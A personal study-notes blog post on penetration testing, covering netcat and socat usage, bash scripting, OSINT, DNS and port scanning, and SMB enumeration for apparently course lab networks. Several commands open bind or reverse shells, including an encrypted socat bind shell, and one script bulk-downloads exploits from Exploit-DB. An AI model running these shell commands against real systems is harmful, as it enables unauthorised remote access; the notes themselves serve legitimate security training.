---
title: Study Notes - 2021/03/14
date: 2021-03-14 19:18:50
tags: [Penetration Testing, Study Notes]
---

# Practical Tools
## Netcat
`nc -nvlp 4444 -e /usr/bin/bash`  
`nc -nv 192.168.xxx.xx 4444 -e /usr/bin/bash`  

Transfer file:  
`nc -nvlp 4444 > incoming.txt`  
`nc -nv xxx.xxx.xxx.xxx 4444 < sendfile.txt`

## socat 
`socat - TCP4:10.11.0.22:110`  
`sudo socat TCP4-LISTEN:443 STDOUT`  
`sudo socat TCP4-LISTEN:443,fork file:secret.txt`  
`socat TCP4:localhost:443 file:receive.txt,create `  
### reverse shell
`sudo socat -d -d TCP4-LISTEN:443 STDOUT`  
`socat TCP4:localhost:443 EXEC:/bin/bash`  
-d -d increase verbose level two times  

### encrypted bind shells
create certificate:  
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`  
`cat bind_shell.key bind_shell.crt > bind_shell.pem`  
`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`  
`socat - OPENSSL:localhost:443,verify=0`  

# Powershell
`Set-ExecutionPolicy Unrestricted`

## file transfer
...
Let me skip this  
## Wireshark  
catpure filter:  
`net 10.11.1.0/24`  
display filter:  
`tcp.port == 21`  
rightclick package->follow tcp stream  

# TCPDUMP  
`sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head`  

# Bash Scripting
## variable
```
var1=hello
echo $varq
```
```
var1='hell world'
var1="hello world"
```
for single quote: interprets every enclosed character literally  
for double quote: excpet `$`, \`\`\`, and `\`  
```
user=$(whoami)
user2=`whoami`
```
**command execute in a subshell**  
$1, $2 .... arguments  
$? The exit status of the most recently run process   
 
## Reading user input 
`read answer`  assign to answer variable  
-p specify the prompt  
-sp secret prompt  

## Conditions
```
if [ <sometest> ]
then 
    <statements>
elif [ <condition> ]
then 
    <statement>
else
    <statments>
fi
```
```
Operator Description: Expression True if…
!EXPRESSION The EXPRESSION is false.
-n STRING STRING length is greater than zero
-z STRING The length of STRING is zero (empty)
STRING1 != STRING2 STRING1 is not equal to STRING2
STRING1 = STRING2 STRING1 is equal to STRING2
INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2
INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2
INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2
INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2
INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2
INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2
-d FILE FILE exists and is a directory
-e FILE FILE exists
-r FILE FILE exists and has read permission
-s FILE FILE exists and it is not empty
-w FILE FILE exists and has write permission
-x FILE FILE exists and has execute permission
```

`cmd && cmd2` execute cmd2 only if cmd return true/success  
`cmd || cmd2` execute if cmd fails  

```
if [ <cond1> ] && [ <cond2> ]
then
    <statement>
fi
```

## Loops:
### For loop
```
for var-name in <list>
do
    <action>
done

for ip in $(seq 1 10); do echo 10.11.1.$ip; done
for i in {1..10}; do echo 10.11.1.$i;done
```

### While loops
```
while [ <some test> ]
do
    <perform an action>
done
```

## functions 
``
function function_name {
echo "$1"
}

function_name () {
commands...
}

function_name $RANDOM
```

**function must defined before get called**  
### Return
``` bash
function1() {
 return $RANDOM   
}
function1
echo "value returned is $?"
```
### local variable
``` bash 
name1=hello
name2=name2
func1() {
    local name1=world
    name2=changed
}
```


## Some practical usage
```
grep "href=" index.html | grep "\.google" | grep -v "www\.google\.com" | awk -F "http://" '{print $2}' | cut -d "/" -f 1
grep -o '[^/]*\.google\.com' index.html | sort -u > list.txt
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u
```
[^/]* any char except '/'

## Second usage:  
```
searchsploit afd windows -w -t
searchsploit afd windows -w -t | grep http | cut -f 2 -d "|"

```
-w Show URLs to Exploit-DB.com rather than the local path  
```
for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|");
do exp_name=$(echo $e | cut -d "/" -f 5) && url=$(echo $e | sed 's/exploits/raw/') &&
wget -q --no-check-certificate $url -O $exp_name; done
```
-q quite mode  

```
#!/bin/bash
# Bash script to search for a given exploit and download all matches.
for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d "|")
do
exp_name=$(echo $e | cut -d "/" -f 5)
url=$(echo $e | sed 's/exploits/raw/')
wget -q --no-check-certificate $url -O $exp_name
done
```

## Third usage:
```
sudo nmap -A -p80 --open 10.11.1.0/24 -oG nmap-scan_10.11.1.1-254

cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'
```
awk use space as delimiter  

```
for ip in $(cat nmap-scan_10.11.1.1-254 | grep 80 | grep -v "Nmap" | awk '{print $2}'); do cutycapt --url=$ip --out=$ip.png;done
```
cutycapt render the webpage

# Passive Information Gathering  
Passive Information Gathering (also known as Open-source Intelligence or OSINT)  
* never communicate with the target directly 

## Website Recon  
simply browsing the site 

## Whois enueration  
whois google.com, can also look for ns  
reverse lookup:  
`whois <ip>`  

## Google Hacking  
`site:domanname.com filetype:php `
`site:domanname.com -filetyle:html`  
`intitle:"index of" "parent directory"`  
https://www.exploit-db.com/google-hacking-database  


## netcraft 
https://www.netcraft.com/  
https://searchdns.netcraft.com  

## Recon-NG  
## Shodan
## Security headers
https://securityheaders.com/   
## SSL server test 
https://www.ssllabs.com/ssltest/  
analyze ssl configurations  


https://pastebin.com/  

## User information gathering  
### Email Harvesting  
`theHarvester -d hello.com -b google`

https://www.social-searcher.com  
https://digi.ninja/projects/twofi.php  
https://github.com/initstring/linkedin2username  

## StackOverflow?  
## Some frameworks
OSINT Framework https://osintframework.com/  
Maltego https://www.paterva.com/buy/maltego-clients.php  


# Active Information Gathering  
## DNS Enumeration
`host www.google.ca`  
`host -t mx www.google.ca`  

### Forward Lookup bruteforce  
### Reverse lookup bruteforce
```
for ip in $(seq 50 100); do host x.x.x.$ip; done | grep -v "not found"
```

### DNS ZONETRANSFER
`host -l` 
`dnsrecon -d domain -D ~/list -t brt`  


# Port Scanning
`nc -nvv -w 1 -z 10.11.1.220 3388-3390`  
-w option specifies the connection timeout in seconds and -z is used to specify zero-I/O mode  
`nc -nv -u -z -w 1 10.11.1.115 160-162`  -u udp  

## Nmap
-sT connection  
-sU udp scan  
-sS stealth/SYN scan  

### network sweeping 
`nmap -sn 10.11.1.1-254` -sn: Ping Scan - disable port scan  
`nmap -p 80 10.11.1.1-254 -oG web-sweep.txt`  
`nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt`  

top ports determined here: `/usr/share/nmap/nmap-services` 


-O OS fingerprint scan  
-sV determine service and version info  

### Nmap scripting engine (NSE)
## masscan 
sudo apt install masscan


# SMB Enumeration 
port 139, 445  
`nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227`  
`nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254`  
`sudo nbtscan -r 10.11.1.0/24`  


# NFS Enumeration
rpc-bind 107 
